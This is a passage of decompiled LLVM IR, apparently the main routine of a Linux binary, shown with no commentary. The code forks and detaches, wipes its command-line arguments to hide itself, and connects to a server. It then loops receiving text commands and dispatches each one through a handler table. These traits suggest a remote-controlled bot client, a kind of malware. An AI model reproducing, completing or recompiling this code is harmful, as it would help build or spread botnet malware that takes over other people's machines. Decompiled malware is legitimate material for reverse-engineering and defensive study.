  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-60, { 3, 4, 5, 1, 0, 6, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 (i32)* @sleep, { 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @connect, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804b085, { 1, 0 }
  uselistorder label %dec_label_pc_804b06d, { 1, 0 }
  uselistorder label %dec_label_pc_804af3a, { 1, 0 }
  uselistorder label %dec_label_pc_804ae3c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804ae79, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-1480 = alloca i32, align 4
  %stack_var_-2504 = alloca i32, align 4
  %stack_var_-6600 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-456 = alloca i32, align 4
  %stack_var_-6656 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804b0a3 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804b0a3, i32* @ecx, align 4
  %v1_804b0bf = call i32 @fork(i32 %v2_804b0a3)
  %v1_804b0c4 = icmp eq i32 %v1_804b0bf, 0
  br i1 %v1_804b0c4, label %dec_label_pc_804b0d4, label %dec_label_pc_804b0c8

dec_label_pc_804b0c8:                             ; preds = %entry
  store i32 0, i32* %stack_var_-6656, align 4
  %v1_804b0cf = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804b0d4

dec_label_pc_804b0d4:                             ; preds = %entry, %dec_label_pc_804b0c8
  %v1_804b0da = add i32 %v2_804b0a3, 4
  %v2_804b0da = inttoptr i32 %v1_804b0da to i32*
  %v3_804b0da = load i32, i32* %v2_804b0da, align 4
  %v1_804b0dd = inttoptr i32 %v3_804b0da to i32*
  %v2_804b0dd = load i32, i32* %v1_804b0dd, align 4
  store i1 false, i1* @df, align 1
  %v4_804b0ed = inttoptr i32 %v2_804b0dd to i8*
  %v3_804b0f3 = call i32 @_strlen(i8* %v4_804b0ed)
  %v3_804b102 = load i32, i32* %v2_804b0da, align 4
  %v1_804b105 = inttoptr i32 %v3_804b102 to i32*
  %v2_804b105 = load i32, i32* %v1_804b105, align 4
  store i32 %v2_804b105, i32* %stack_var_-6656, align 4
  %v4_804b116 = inttoptr i32 %v2_804b105 to i8*
  %v5_804b116 = call i32 @strncpy(i8* %v4_804b116, i32 ptrtoint ([6 x i8]* @global_var_805b512.123 to i32), i32 %v3_804b0f3)
  br label %dec_label_pc_804b17a

dec_label_pc_804b124:                             ; preds = %dec_label_pc_804b17a
  %v2_804b127 = mul i32 %storemerge11, 4
  %v4_804b130 = load i32, i32* %v2_804b0da, align 4
  %v5_804b130 = add i32 %v4_804b130, %v2_804b127
  %v1_804b133 = inttoptr i32 %v5_804b130 to i32*
  %v2_804b133 = load i32, i32* %v1_804b133, align 4
  store i1 false, i1* @df, align 1
  %v4_804b143 = inttoptr i32 %v2_804b133 to i8*
  store i32 %v2_804b133, i32* @edi, align 4
  %v3_804b149 = call i32 @_strlen(i8* %v4_804b143)
  %v4_804b15e = load i32, i32* %v2_804b0da, align 4
  %v5_804b15e = add i32 %v4_804b15e, %v2_804b127
  %v1_804b161 = inttoptr i32 %v5_804b15e to i32*
  %v2_804b161 = load i32, i32* %v1_804b161, align 4
  store i32 %v2_804b161, i32* %stack_var_-6656, align 4
  %v4_804b172 = inttoptr i32 %v2_804b161 to i8*
  %v5_804b172 = call i32 @__GI_memset(i8* %v4_804b172, i32 0, i32 %v3_804b149)
  %v4_804b177 = add i32 %storemerge11, 1
  br label %dec_label_pc_804b17a

dec_label_pc_804b17a:                             ; preds = %dec_label_pc_804b0d4, %dec_label_pc_804b124
  %storemerge11 = phi i32 [ %v4_804b177, %dec_label_pc_804b124 ], [ 1, %dec_label_pc_804b0d4 ]
  store i32 %v2_804b0a3, i32* @edi, align 4
  %v3_804b183 = load i32, i32* %stack_var_4, align 4
  %v5_804b185 = icmp slt i32 %storemerge11, %v3_804b183
  br i1 %v5_804b185, label %dec_label_pc_804b124, label %dec_label_pc_804b187

dec_label_pc_804b187:                             ; preds = %dec_label_pc_804b17a
  store i32 0, i32* %stack_var_-6656, align 4
  %v2_804b18e = call i32 @__GI_time(i32* null)
  store i32 %v2_804b18e, i32* @ebx, align 4
  %v0_804b195 = load i32, i32* %stack_var_-6656, align 4
  %v1_804b195 = call i32 @__libc_getpid(i32 %v0_804b195)
  %v0_804b19a = load i32, i32* @ebx, align 4
  %v2_804b19a = xor i32 %v0_804b19a, %v1_804b195
  store i32 %v2_804b19a, i32* @ebx, align 4
  %v0_804b19c = load i32, i32* %stack_var_-6656, align 4
  %v1_804b19c = call i32 @getppid(i32 %v0_804b19c)
  %v0_804b1a1 = load i32, i32* @ebx, align 4
  %v2_804b1a1 = add i32 %v0_804b1a1, %v1_804b19c
  store i32 %v2_804b1a1, i32* %stack_var_-6656, align 4
  %v1_804b1a7 = call i32 @srand(i32 %v2_804b1a1)
  %v0_804b1ac = call i32 @makestring()
  store i32 %v0_804b1ac, i32* @global_var_80678c4.101, align 4
  %v0_804b1b6 = call i32 @makestring()
  store i32 %v0_804b1b6, i32* @global_var_80678c0.36, align 64
  %v0_804b1c0 = call i32 @makestring()
  store i32 %v0_804b1c0, i32* @global_var_80678cc.124, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_805b518.125 to i32), i32* @global_var_80679e8.100, align 8
  store i32 ptrtoint ([5 x i8]* @global_var_805b522.126 to i32), i32* @global_var_80679e4.112, align 4
  store i32 0, i32* @global_var_80679e0.80, align 32
  %v2_804b22e = ptrtoint i32* %stack_var_-456 to i32
  %tmp73 = bitcast i32* %stack_var_-456 to i8*
  %v4_804b279 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804b3f1 = ptrtoint i32* %stack_var_-6600 to i32
  %v2_804b4c3 = ptrtoint i32* %stack_var_-2504 to i32
  %v2_804b51c = ptrtoint i32* %stack_var_-1480 to i32
  %v3_804b525 = bitcast i32* %stack_var_-1480 to i8*
  %tmp74 = bitcast i8** %stack_var_-28 to i32*
  %v2_804b4a6 = bitcast i32* %stack_var_-2504 to i8*
  br label %dec_label_pc_804b1ea

dec_label_pc_804b1ea:                             ; preds = %dec_label_pc_804b3dc, %dec_label_pc_804b224, %dec_label_pc_804b5a0, %dec_label_pc_804b187
  %v0_804b1ea = call i32 @con()
  %v0_804b200 = load i32, i32* @global_var_80678c8.28, align 8
  store i32 %v0_804b200, i32* @ebx, align 4
  store i32 %v0_804b200, i32* %stack_var_-6656, align 4
  %v3_804b21d = call i32 @Send(i32 %v0_804b200, i32 ptrtoint ([41 x i8]* @global_var_805b528.127 to i32))
  br label %dec_label_pc_804b224

dec_label_pc_804b224:                             ; preds = %dec_label_pc_804b3b7, %dec_label_pc_804b410, %dec_label_pc_804b5be, %dec_label_pc_804b5df, %dec_label_pc_804b1ea
  store i32 %v2_804b22e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804b235 = call i8* @_memset(i8* %tmp73, i32 0, i32 32)
  %v0_804b23d = load i32, i32* @global_var_80678c8.28, align 8
  %v2_804b244 = udiv i32 %v0_804b23d, 32
  %v1_804b24c = urem i32 %v0_804b23d, 32
  %v0_804b24f = load i32, i32* @ebp, align 4
  %v2_804b24f = mul nuw nsw i32 %v2_804b244, 4
  %v3_804b24f = add nsw i32 %v2_804b24f, -448
  %v4_804b24f = add i32 %v3_804b24f, %v0_804b24f
  %v5_804b24f = inttoptr i32 %v4_804b24f to i32*
  %v6_804b24f = load i32, i32* %v5_804b24f, align 4
  %v9_804b24f = shl i32 1, %v1_804b24c
  %v12_804b24f = or i32 %v6_804b24f, %v9_804b24f
  store i32 %v12_804b24f, i32* %v5_804b24f, align 4
  store i32 1200, i32* %stack_var_-328, align 4
  %v0_804b26b = load i32, i32* @global_var_80678c8.28, align 8
  %v1_804b270 = add i32 %v0_804b26b, 1
  store i32 %v1_804b270, i32* %stack_var_-6656, align 4
  %v6_804b29a = call i32 @__libc_select(i32 %v1_804b270, i32 %v2_804b22e, i32 0, i32 0, i32 %v4_804b279)
  %tmp75 = icmp slt i32 %v6_804b29a, 1
  br i1 %tmp75, label %dec_label_pc_804b1ea, label %dec_label_pc_804b3a9.preheader

dec_label_pc_804b3a9.preheader:                   ; preds = %dec_label_pc_804b224
  %v0_804b3a997 = load i32, i32* @global_var_8062e30.30, align 16
  %v10_804b3ae99 = icmp eq i32 %v0_804b3a997, 0
  br i1 %v10_804b3ae99, label %dec_label_pc_804b3b7, label %dec_label_pc_804b2b3

dec_label_pc_804b2b3:                             ; preds = %dec_label_pc_804b3a9.preheader, %dec_label_pc_804b3a6
  %storemerge8106 = phi i32 [ %.pre, %dec_label_pc_804b3a6 ], [ 0, %dec_label_pc_804b3a9.preheader ]
  %v2_804b2b6 = mul i32 %storemerge8106, 4
  %v0_804b2bb = load i32, i32* @global_var_80679ec.31, align 4
  %v2_804b2c0 = add i32 %v0_804b2bb, %v2_804b2b6
  %v1_804b2c3 = inttoptr i32 %v2_804b2c0 to i32*
  %v2_804b2c3 = load i32, i32* %v1_804b2c3, align 4
  store i32 %v2_804b2c3, i32* %stack_var_-6656, align 4
  %v4_804b2d8 = call i32 @waitpid(i32 %v2_804b2c3, i32 0, i32 1)
  %tmp76 = icmp slt i32 %v4_804b2d8, 1
  %.pre = add i32 %storemerge8106, 1
  br i1 %tmp76, label %dec_label_pc_804b3a6, label %dec_label_pc_804b2e5

dec_label_pc_804b2e5:                             ; preds = %dec_label_pc_804b2b3
  %v0_804b31880 = load i32, i32* @global_var_8062e30.30, align 16
  %v10_804b31d81 = icmp ult i32 %.pre, %v0_804b31880
  %v2_804b2f182 = mul i32 %.pre, 4
  %v0_804b2f683 = load i32, i32* @global_var_80679ec.31, align 4
  %v2_804b2fb84 = add i32 %v0_804b2f683, %v2_804b2f182
  %v1_804b2fe85 = add i32 %v2_804b2fb84, -4
  br i1 %v10_804b31d81, label %dec_label_pc_804b2ee, label %dec_label_pc_804b322

dec_label_pc_804b2ee:                             ; preds = %dec_label_pc_804b2e5, %dec_label_pc_804b2ee
  %v1_804b2fe89 = phi i32 [ %v1_804b2fe, %dec_label_pc_804b2ee ], [ %v1_804b2fe85, %dec_label_pc_804b2e5 ]
  %v2_804b2fb88 = phi i32 [ %v2_804b2fb, %dec_label_pc_804b2ee ], [ %v2_804b2fb84, %dec_label_pc_804b2e5 ]
  %storemerge1086 = phi i32 [ %v4_804b315, %dec_label_pc_804b2ee ], [ %.pre, %dec_label_pc_804b2e5 ]
  store i32 %v1_804b2fe89, i32* @ecx, align 4
  %v1_804b311 = inttoptr i32 %v2_804b2fb88 to i32*
  %v2_804b311 = load i32, i32* %v1_804b311, align 4
  %v2_804b313 = inttoptr i32 %v1_804b2fe89 to i32*
  store i32 %v2_804b311, i32* %v2_804b313, align 4
  %v4_804b315 = add i32 %storemerge1086, 1
  %v0_804b318 = load i32, i32* @global_var_8062e30.30, align 16
  %v10_804b31d = icmp ult i32 %v4_804b315, %v0_804b318
  %v2_804b2f1 = mul i32 %v4_804b315, 4
  %v0_804b2f6 = load i32, i32* @global_var_80679ec.31, align 4
  %v2_804b2fb = add i32 %v0_804b2f6, %v2_804b2f1
  %v1_804b2fe = add i32 %v2_804b2fb, -4
  br i1 %v10_804b31d, label %dec_label_pc_804b2ee, label %dec_label_pc_804b322

dec_label_pc_804b322:                             ; preds = %dec_label_pc_804b2ee, %dec_label_pc_804b2e5
  %v1_804b2fe.lcssa = phi i32 [ %v1_804b2fe85, %dec_label_pc_804b2e5 ], [ %v1_804b2fe, %dec_label_pc_804b2ee ]
  %v1_804b335 = inttoptr i32 %v1_804b2fe.lcssa to i32*
  store i32 0, i32* %v1_804b335, align 4
  %v0_804b33b = load i32, i32* @global_var_8062e30.30, align 16
  %v1_804b340 = add i32 %v0_804b33b, -1
  store i32 %v1_804b340, i32* @global_var_8062e30.30, align 16
  %v2_804b34b = mul i32 %v1_804b340, 4
  %v1_804b34e = add i32 %v2_804b34b, 4
  store i32 %v1_804b34e, i32* %stack_var_-6656, align 4
  %v1_804b354 = call i32 @malloc(i32 %v1_804b34e)
  %v0_804b38790 = load i32, i32* @global_var_8062e30.30, align 16
  %v10_804b38c92 = icmp eq i32 %v0_804b38790, 0
  br i1 %v10_804b38c92, label %dec_label_pc_804b391, label %dec_label_pc_804b365

dec_label_pc_804b365:                             ; preds = %dec_label_pc_804b322, %dec_label_pc_804b365
  %storemerge993 = phi i32 [ %v4_804b384, %dec_label_pc_804b365 ], [ 0, %dec_label_pc_804b322 ]
  %v2_804b368 = mul i32 %storemerge993, 4
  %v5_804b36d = add i32 %v2_804b368, %v1_804b354
  store i32 %v5_804b36d, i32* @ecx, align 4
  %v0_804b378 = load i32, i32* @global_var_80679ec.31, align 4
  %v2_804b37d = add i32 %v0_804b378, %v2_804b368
  %v1_804b380 = inttoptr i32 %v2_804b37d to i32*
  %v2_804b380 = load i32, i32* %v1_804b380, align 4
  %v2_804b382 = inttoptr i32 %v5_804b36d to i32*
  store i32 %v2_804b380, i32* %v2_804b382, align 4
  %v4_804b384 = add i32 %storemerge993, 1
  %v0_804b387 = load i32, i32* @global_var_8062e30.30, align 16
  %v10_804b38c = icmp ult i32 %v4_804b384, %v0_804b387
  br i1 %v10_804b38c, label %dec_label_pc_804b365, label %dec_label_pc_804b387.dec_label_pc_804b391_crit_edge

dec_label_pc_804b387.dec_label_pc_804b391_crit_edge: ; preds = %dec_label_pc_804b365
  br label %dec_label_pc_804b391

dec_label_pc_804b391:                             ; preds = %dec_label_pc_804b322, %dec_label_pc_804b387.dec_label_pc_804b391_crit_edge
  %v0_804b391 = load i32, i32* @global_var_80679ec.31, align 4
  %v1_804b399 = call i32 @free(i32 %v0_804b391)
  store i32 %v1_804b354, i32* @global_var_80679ec.31, align 4
  br label %dec_label_pc_804b3a6

dec_label_pc_804b3a6:                             ; preds = %dec_label_pc_804b2b3, %dec_label_pc_804b391
  %v0_804b3a9 = load i32, i32* @global_var_8062e30.30, align 16
  %v10_804b3ae = icmp ult i32 %.pre, %v0_804b3a9
  br i1 %v10_804b3ae, label %dec_label_pc_804b2b3, label %dec_label_pc_804b3b7

dec_label_pc_804b3b7:                             ; preds = %dec_label_pc_804b3a9.preheader, %dec_label_pc_804b3a6
  %v0_804b3b7 = load i32, i32* @global_var_80678c8.28, align 8
  %v1_804b3be = urem i32 %v0_804b3b7, 32
  %v2_804b3c6 = udiv i32 %v0_804b3b7, 32
  %v0_804b3c9 = load i32, i32* @ebp, align 4
  %v2_804b3c9 = mul nuw nsw i32 %v2_804b3c6, 4
  %v3_804b3c9 = add nsw i32 %v2_804b3c9, -448
  %v4_804b3c9 = add i32 %v3_804b3c9, %v0_804b3c9
  %v5_804b3c9 = inttoptr i32 %v4_804b3c9 to i32*
  %v6_804b3c9 = load i32, i32* %v5_804b3c9, align 4
  %v9_804b3c9 = shl i32 1, %v1_804b3be
  %v10_804b3c9 = and i32 %v6_804b3c9, %v9_804b3c9
  %v11_804b3c9 = icmp ne i32 %v10_804b3c9, 0
  %v4_804b3d4 = icmp eq i1 %v11_804b3c9, false
  br i1 %v4_804b3d4, label %dec_label_pc_804b224, label %dec_label_pc_804b3dc

dec_label_pc_804b3dc:                             ; preds = %dec_label_pc_804b3b7
  store i32 %v0_804b3b7, i32* %stack_var_-6656, align 4
  %v5_804b3fe = call i32 @recv(i32 %v0_804b3b7, i32 %v2_804b3f1, i32 4096, i32 0)
  %tmp77 = icmp slt i32 %v5_804b3fe, 1
  br i1 %tmp77, label %dec_label_pc_804b1ea, label %dec_label_pc_804b410

dec_label_pc_804b410:                             ; preds = %dec_label_pc_804b3dc
  %v0_804b413 = load i32, i32* @ebp, align 4
  %v2_804b413 = add i32 %v5_804b3fe, -6592
  %v3_804b413 = add i32 %v2_804b413, %v0_804b413
  %v4_804b413 = inttoptr i32 %v3_804b413 to i8*
  store i8 0, i8* %v4_804b413, align 1
  store i32 ptrtoint (i32* @global_var_805b551.128 to i32), i32* %stack_var_-6656, align 4
  store i32 %v2_804b3f1, i32* @eax, align 4
  %v2_804b42c = call i32 @__GI_strtok(i32 %v2_804b3f1, i32 ptrtoint (i32* @global_var_805b551.128 to i32))
  %v5_804b431 = inttoptr i32 %v2_804b42c to i8*
  store i8* %v5_804b431, i8** %stack_var_-28, align 4
  %v5_804b5d515 = icmp eq i32 %v2_804b42c, 0
  br i1 %v5_804b5d515, label %dec_label_pc_804b224, label %dec_label_pc_804b5df

dec_label_pc_804b439:                             ; preds = %dec_label_pc_804b5df
  store i32 %v4_804b5df, i32* %stack_var_-6656, align 4
  %v2_804b43f = call i32 @filter(i8* %v4_804b50f36)
  %v2_804b447 = load i8, i8* %v4_804b50f36, align 1
  %v10_804b44a = icmp eq i8 %v2_804b447, 58
  %v1_804b44c = icmp eq i1 %v10_804b44a, false
  br i1 %v1_804b44c, label %dec_label_pc_804b4c3, label %dec_label_pc_804b45a.preheader

dec_label_pc_804b45a.preheader:                   ; preds = %dec_label_pc_804b439
  br label %dec_label_pc_804b45a

dec_label_pc_804b457:                             ; preds = %dec_label_pc_804b47f
  %v4_804b457 = add i32 %storemerge7, 1
  br label %dec_label_pc_804b45a

dec_label_pc_804b45a:                             ; preds = %dec_label_pc_804b45a.preheader, %dec_label_pc_804b457
  %storemerge7 = phi i32 [ %v4_804b457, %dec_label_pc_804b457 ], [ 0, %dec_label_pc_804b45a.preheader ]
  store i1 false, i1* @df, align 1
  %v3_804b474 = call i32 @_strlen(i8* %v4_804b50f36)
  %v7_804b47b = icmp ult i32 %storemerge7, %v3_804b474
  %v1_804b47d = icmp eq i1 %v7_804b47b, false
  %.pre123 = add i32 %storemerge7, %v4_804b5df
  br i1 %v1_804b47d, label %dec_label_pc_804b45a.dec_label_pc_804b48c_crit_edge, label %dec_label_pc_804b47f

dec_label_pc_804b45a.dec_label_pc_804b48c_crit_edge: ; preds = %dec_label_pc_804b45a
  %.pre124 = inttoptr i32 %.pre123 to i8*
  br label %dec_label_pc_804b48c

dec_label_pc_804b47f:                             ; preds = %dec_label_pc_804b45a
  %v1_804b485 = inttoptr i32 %.pre123 to i8*
  %v2_804b485 = load i8, i8* %v1_804b485, align 1
  %v7_804b488 = icmp eq i8 %v2_804b485, 32
  %v1_804b48a = icmp eq i1 %v7_804b488, false
  br i1 %v1_804b48a, label %dec_label_pc_804b457, label %dec_label_pc_804b48c

dec_label_pc_804b48c:                             ; preds = %dec_label_pc_804b45a.dec_label_pc_804b48c_crit_edge, %dec_label_pc_804b47f
  %v1_804b492.pre-phi = phi i8* [ %.pre124, %dec_label_pc_804b45a.dec_label_pc_804b48c_crit_edge ], [ %v1_804b485, %dec_label_pc_804b47f ]
  store i8 0, i8* %v1_804b492.pre-phi, align 1
  %v3_804b495 = load i8*, i8** %stack_var_-28, align 4
  %v4_804b495 = ptrtoint i8* %v3_804b495 to i32
  %v1_804b498 = add i32 %v4_804b495, 1
  store i32 %v1_804b498, i32* %stack_var_-6656, align 4
  store i32 %v2_804b4c3, i32* @eax, align 4
  %v3_804b4a6 = call i32 @strcpy(i8* %v2_804b4a6, i32 %v1_804b498)
  %v6_804b4ae = add i32 %v4_804b495, %storemerge7
  %v1_804b4b1 = add i32 %v6_804b4ae, 1
  store i32 %v1_804b4b1, i32* %stack_var_-6656, align 4
  store i32 %v4_804b495, i32* @eax, align 4
  %v3_804b4bc = call i32 @strcpy(i8* %v3_804b495, i32 %v1_804b4b1)
  br label %dec_label_pc_804b4da.preheader

dec_label_pc_804b4c3:                             ; preds = %dec_label_pc_804b439
  store i32 42, i32* %stack_var_-2504, align 4
  br label %dec_label_pc_804b4da.preheader

dec_label_pc_804b4da.preheader:                   ; preds = %dec_label_pc_804b48c, %dec_label_pc_804b4c3
  %v4_804b50f = phi i8* [ %v3_804b495, %dec_label_pc_804b48c ], [ %v4_804b50f36, %dec_label_pc_804b4c3 ]
  %v4_804b4dd = ptrtoint i8* %v4_804b50f to i32
  br label %dec_label_pc_804b4da

dec_label_pc_804b4d7:                             ; preds = %dec_label_pc_804b4ff
  %v4_804b4d7 = add i32 %storemerge6, 1
  br label %dec_label_pc_804b4da

dec_label_pc_804b4da:                             ; preds = %dec_label_pc_804b4da.preheader, %dec_label_pc_804b4d7
  %storemerge6 = phi i32 [ %v4_804b4d7, %dec_label_pc_804b4d7 ], [ 0, %dec_label_pc_804b4da.preheader ]
  store i1 false, i1* @df, align 1
  store i32 %v4_804b4dd, i32* @edi, align 4
  %v3_804b4f4 = call i32 @_strlen(i8* %v4_804b50f)
  %v7_804b4fb = icmp ult i32 %storemerge6, %v3_804b4f4
  %v1_804b4fd = icmp eq i1 %v7_804b4fb, false
  %.pre118 = add i32 %storemerge6, %v4_804b4dd
  br i1 %v1_804b4fd, label %dec_label_pc_804b4da.dec_label_pc_804b50c_crit_edge, label %dec_label_pc_804b4ff

dec_label_pc_804b4da.dec_label_pc_804b50c_crit_edge: ; preds = %dec_label_pc_804b4da
  %.pre122 = inttoptr i32 %.pre118 to i8*
  br label %dec_label_pc_804b50c

dec_label_pc_804b4ff:                             ; preds = %dec_label_pc_804b4da
  %v1_804b505 = inttoptr i32 %.pre118 to i8*
  %v2_804b505 = load i8, i8* %v1_804b505, align 1
  %v7_804b508 = icmp eq i8 %v2_804b505, 32
  %v1_804b50a = icmp eq i1 %v7_804b508, false
  br i1 %v1_804b50a, label %dec_label_pc_804b4d7, label %dec_label_pc_804b50c

dec_label_pc_804b50c:                             ; preds = %dec_label_pc_804b4da.dec_label_pc_804b50c_crit_edge, %dec_label_pc_804b4ff
  %v1_804b512.pre-phi = phi i8* [ %.pre122, %dec_label_pc_804b4da.dec_label_pc_804b50c_crit_edge ], [ %v1_804b505, %dec_label_pc_804b4ff ]
  store i8 0, i8* %v1_804b512.pre-phi, align 1
  %v3_804b515 = load i8*, i8** %stack_var_-28, align 4
  store i32 %v2_804b51c, i32* @eax, align 4
  store i32 %v2_804b51c, i32* %stack_var_-6656, align 4
  %v2_804b525 = ptrtoint i8* %v3_804b515 to i32
  %v4_804b525 = call i32 @strcpy(i8* %v3_804b525, i32 %v2_804b525)
  %v6_804b52d = add i32 %v2_804b525, %storemerge6
  %v1_804b530 = add i32 %v6_804b52d, 1
  store i32 %v2_804b525, i32* @eax, align 4
  store i32 %v2_804b525, i32* %stack_var_-6656, align 4
  %v4_804b53b = call i32 @strcpy(i8* %v3_804b515, i32 %v1_804b530)
  %v4_804b595108 = load i32, i32* bitcast ([4 x i8]** @global_var_805e660.130 to i32*), align 8
  %v1_804b59c109 = icmp eq i32 %v4_804b595108, 0
  %v1_804b59e111 = icmp eq i1 %v1_804b59c109, false
  br i1 %v1_804b59e111, label %dec_label_pc_804b549, label %dec_label_pc_804b5a0

dec_label_pc_804b549:                             ; preds = %dec_label_pc_804b50c, %dec_label_pc_804b549
  %v3_804b595114 = phi i32* [ %v3_804b595, %dec_label_pc_804b549 ], [ bitcast ([4 x i8]** @global_var_805e660.130 to i32*), %dec_label_pc_804b50c ]
  %v1_804b595113 = phi i32 [ %v1_804b595, %dec_label_pc_804b549 ], [ 0, %dec_label_pc_804b50c ]
  %storemerge112 = phi i32 [ %v4_804b58f, %dec_label_pc_804b549 ], [ 0, %dec_label_pc_804b50c ]
  %v4_804b54c = load i32, i32* %v3_804b595114, align 8
  store i32 %v4_804b54c, i32* %stack_var_-6656, align 4
  %v3_804b560 = inttoptr i32 %v4_804b54c to i8*
  %v4_804b560 = call i32 @__GI_strcasecmp(i8* %v3_804b560, i32 %v2_804b51c)
  %v2_804b56c = add i32 %v1_804b595113, ptrtoint (i32* @global_var_805e664.131 to i32)
  %v3_804b56c = inttoptr i32 %v2_804b56c to i32*
  %v4_804b56c = load i32, i32* %v3_804b56c, align 4
  %v0_804b573 = load i32, i32* @global_var_80678c8.28, align 8
  store i32 %v0_804b573, i32* @edx, align 4
  store i32 %v0_804b573, i32* %stack_var_-6656, align 4
  call void @__pseudo_call(i32 %v4_804b56c)
  %v4_804b58f = add i32 %storemerge112, 1
  %v1_804b595 = mul i32 %v4_804b58f, 8
  %v2_804b595 = add i32 %v1_804b595, ptrtoint ([4 x i8]** @global_var_805e660.130 to i32)
  %v3_804b595 = inttoptr i32 %v2_804b595 to i32*
  %v4_804b595 = load i32, i32* %v3_804b595, align 8
  %v1_804b59c = icmp eq i32 %v4_804b595, 0
  %v1_804b59e = icmp eq i1 %v1_804b59c, false
  br i1 %v1_804b59e, label %dec_label_pc_804b549, label %dec_label_pc_804b5a0

dec_label_pc_804b5a0:                             ; preds = %dec_label_pc_804b549, %dec_label_pc_804b50c
  store i32 %v2_804b51c, i32* %stack_var_-6656, align 4
  %v4_804b5b1 = call i32 @__GI_strcasecmp(i8* %v3_804b525, i32 ptrtoint ([6 x i8]* @global_var_805b553.132 to i32))
  store i32 %v4_804b5b1, i32* @eax, align 4
  %v1_804b5b6 = icmp eq i32 %v4_804b5b1, 0
  br i1 %v1_804b5b6, label %dec_label_pc_804b1ea, label %dec_label_pc_804b5be

dec_label_pc_804b5be:                             ; preds = %dec_label_pc_804b5a0
  store i32 0, i32* %stack_var_-6656, align 4
  %v3_804b5cd = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805b551.128 to i32))
  store i32 %v3_804b5cd, i32* %tmp74, align 4
  %v5_804b5d5 = icmp eq i32 %v3_804b5cd, 0
  %tmp78 = inttoptr i32 %v3_804b5cd to i8*
  br i1 %v5_804b5d5, label %dec_label_pc_804b224, label %dec_label_pc_804b5df

dec_label_pc_804b5df:                             ; preds = %dec_label_pc_804b410, %dec_label_pc_804b5be
  %v4_804b50f36 = phi i8* [ %tmp78, %dec_label_pc_804b5be ], [ %v5_804b431, %dec_label_pc_804b410 ]
  %v4_804b5df = ptrtoint i8* %v4_804b50f36 to i32
  %v2_804b5e2 = load i8, i8* %v4_804b50f36, align 1
  %v4_804b5e5 = icmp eq i8 %v2_804b5e2, 0
  %v1_804b5e7 = icmp eq i1 %v4_804b5e5, false
  br i1 %v1_804b5e7, label %dec_label_pc_804b439, label %dec_label_pc_804b224

; uselistorder directives
  uselistorder i32 %v4_804b5df, { 1, 0 }
  uselistorder i8* %v4_804b50f36, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32* %v3_804b595, { 1, 0 }
  uselistorder i32 %v1_804b595, { 1, 0 }
  uselistorder i32 %v4_804b58f, { 1, 0 }
  uselistorder i32 %v2_804b525, { 2, 1, 0, 3 }
  uselistorder i32 %storemerge6, { 2, 1, 0, 3 }
  uselistorder i32 %v4_804b495, { 1, 0, 2 }
  uselistorder i32 %storemerge7, { 2, 1, 0, 3 }
  uselistorder i32 %v5_804b3fe, { 1, 0 }
  uselistorder i32 %v0_804b3b7, { 2, 3, 0, 1 }
  uselistorder i32 %v4_804b384, { 1, 0 }
  uselistorder i32 %v2_804b368, { 1, 0 }
  uselistorder i32 %storemerge993, { 1, 0 }
  uselistorder i32 %v1_804b354, { 1, 0 }
  uselistorder i32 %v2_804b2fb, { 1, 0 }
  uselistorder i32 %v4_804b315, { 0, 2, 1 }
  uselistorder i32 %v1_804b2fe89, { 1, 0 }
  uselistorder i32 %.pre, { 3, 1, 0, 4, 2 }
  uselistorder i32 %storemerge8106, { 1, 0 }
  uselistorder i32 %v1_804b270, { 1, 0 }
  uselistorder i32 %v0_804b23d, { 1, 0 }
  uselistorder i32 %v0_804b200, { 1, 0, 2 }
  uselistorder i32 %storemerge11, { 2, 0, 1 }
  uselistorder i32 %v2_804b127, { 1, 0 }
  uselistorder i32* %stack_var_-6656, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1, 18, 19, 20, 21 }
  uselistorder i32* %stack_var_-2504, { 1, 0, 2 }
  uselistorder i8** %stack_var_-28, { 3, 2, 1, 0 }
  uselistorder [4 x i8]** @global_var_805e660.130, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @recv, { 5, 4, 1, 3, 0, 2 }
  uselistorder i32* @global_var_80679ec.31, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @global_var_8062e30.30, { 5, 6, 1, 7, 8, 9, 2, 0, 10, 3, 11, 4, 12, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32)* @Send, { 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14 }
  uselistorder i32 ()* @makestring, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder label %dec_label_pc_804b5df, { 1, 0 }
  uselistorder label %dec_label_pc_804b549, { 1, 0 }
  uselistorder label %dec_label_pc_804b50c, { 1, 0 }
  uselistorder label %dec_label_pc_804b4da, { 1, 0 }
  uselistorder label %dec_label_pc_804b4da.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804b48c, { 1, 0 }
  uselistorder label %dec_label_pc_804b45a, { 1, 0 }
